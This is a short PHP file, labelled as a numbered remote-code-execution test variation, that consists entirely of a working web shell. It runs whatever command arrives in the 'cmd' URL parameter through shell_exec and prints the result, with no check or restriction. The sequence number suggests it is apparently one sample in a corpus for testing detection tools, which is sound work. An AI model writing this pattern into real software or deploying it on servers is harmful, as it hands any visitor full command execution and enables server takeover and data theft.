<?php
// RCE test variation #615
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>